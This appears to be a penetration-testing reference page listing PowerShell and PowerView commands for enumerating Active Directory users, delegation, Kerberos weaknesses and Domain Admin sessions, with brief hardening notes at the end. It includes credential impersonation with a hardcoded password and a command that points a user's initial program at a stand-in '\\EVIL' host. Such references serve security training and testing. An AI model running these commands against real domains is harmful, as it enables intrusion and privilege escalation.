---
title: "Domain Users"
description: "Enumerating Domain Users."
lead: "Enumerating information about Domain Users using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T17:55:08+01:00
lastmod: 2021-11-07T17:55:08+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 10
toc: true
---

## Get List of Users in current Domain

```powershell
# AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
Get-ADUser -Filter * -Properties * | Select Name

# PowerView
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | Select cn
```

## Get List of all Properties for Users in current Domain

```powershell
# AD Module
Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | Select Name
Get-ADUser -Filter * -Properties * | Select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

## Find all Users with an SPN

```powershell
# PowerView
Get-DomainUser -SPN
```

## Find all Service Accounts in "Domain Admins"

```powershell
# PowerView
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```

## Check for Users who don't have Kerberos Preauthentication set

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

## Find Users with sidHistory set

```powershell
# PowerView
Get-DomainUser -LDAPFilter '(sidHistory=*)'
```

## Find any Users with Constrained Delegation set

```powershell
# PowerView
Get-DomainUser -TrustedToAuth
```

## Find all Privileged Users that aren't marked as sensitive/not for Delegation

```powershell
# PowerView
Get-DomainUser -AllowDelegation -AdminCount
```

## Get list of all Properties for Users in current Domain

```powershell
# PowerView
Get-UserProperty
Get-UserProperty -Properties pwdlastset
```

## Search for a particular String in a User's Attributes

```powershell
# AD Module
Get-ADUser -Filter 'Description -Like "*built*"' -Properties Description | Select name,Description

# PowerView
Find-UserField -SearchField Description -SearchTerm "built"
```

## Get actively logged on Users on a Computer (needs local admin rights on the target)

```powershell
# PowerView
Get-NetLoggedOn -ComputerName dc.lab.local
```

## Get actively logged on Users on a Computer

```powershell
# PowerView
Get-LoggedOnLocal -ComputerName dc.lab.local
```

## Get the last logged User on a Computer

```powershell
# PowerView
Get-LastLoggedOn -ComputerName dc.lab.local
```

## Get all Users with Passwords changed > 1 year ago

```powershell
# PowerView
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
```

## Get all enabled Users

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```

## Get all disabled Users

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter AccountDISABLE
```

## Get all Users that require Smart Card Authentication

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED
```

## Get all Users that *don't* require Smart Card Authentication

```powershell
# PowerView
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
```

## Use multiple Identity Types for any *-Domain* function

```powershell
# PowerView
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
```

## Enumerate all Foreign Users in the Global Catalog, and query the specified Domain localgroups for their Memberships

```powershell
# PowerView

# query the global catalog for foreign security principals with Domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the Domain the foreign User was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this Domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all Domain local groups from the given Domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl
```

## If running in -sta mode, impersonate another Credential a la "runas /netonly"

```powershell
# PowerView

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```

## Set the specified Property for the given User identity

```powershell
# PowerView
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
```

## Set the Owner of 'dfm' in the current Domain to 'bufu'

```powershell
# PowerView
Set-DomainObjectOwner -Identity dfm -OwnerIdentity bufu
```

## Retrieve *most* Users who can perform DC replication for dev.testlab.local (i.e. DCsync)

```powershell
# PowerView
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}
```

## Check if any User passwords are set

```powershell
# PowerView
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

## User Hunting with PowerView

### Find all machines on the current Domain where the current User has local Admin Access

This function queries the DC of the current or provided Domain for a list of Computers (`Get-NetComputer`) and then use multi-threaded ``Invoke-CheckLocalAdminAccess`` on each machine.

Can also be done using WMI and PowerShell Remoting, see ``Find-WMILocalAdminAccess.ps1`` and ``Find-PSRemotingLocalAdminAccess.ps1``.

```powershell
Find-LocalAdminAccess -Verbose
```

### Find local Admins on all Machines

Needs administrator privs on non-dc machines.

This function queries the DC of the current or provided Domain for a list of Computers (``Get-NetComputer``) and then use multi-threaded ``Get-NetLocalGroup`` on each machine.

```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

### Find Computers where a Domain Admin (or specified User/group) has Sessions

This function queries the DC of the current or provided Domain for members of the given group (Domain Admins by default) using ``Get-NetGroupMember``, gets a list of Computers (``Get-NetComputer``) and list sessions and logged on Users (``Get-NetSession`` / ``Get-NetLoggedon``) from each one.

```powershell
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```

### Confirm Admin Access

```powershell
Invoke-UserHunter -CheckAccess
```

### Find Computers where a Domain admin is logged-in

This option queries the DC of the current or provided Domain for members of the given group (Domain Admins by default) using ``Get-NetGroupMember``, gets a list *only* of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on Users (``Get-NetSession`` / ``Get-NetLoggedon``) from each machine.

```powershell
Invoke-UserHunter -Stealth
```

### Enumerate servers that allow Unconstrained Delegation and show all logged in Users

``Find-DomainUserLocation`` == old ``Invoke-UserHunter``

```powershell
Find-DomainUserLocation -ComputerUnconstrained -ShowAll
```

### Hunt for Admin Users that allow Delegation, logged into Servers that allow Unconstrained Delegation

```powershell
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

### Defending against User Hunting

#### NetCease

- Script to change permissions on `NetSessionEnum` method by removing permissions for `Authenticated Users` group
- Fails many of the attacker's session enumeration and hence User hunting capabilities

```powershell
.\NetCease.ps1
```

#### SAMRi10

- From same author as NetCease
- Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)
- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b
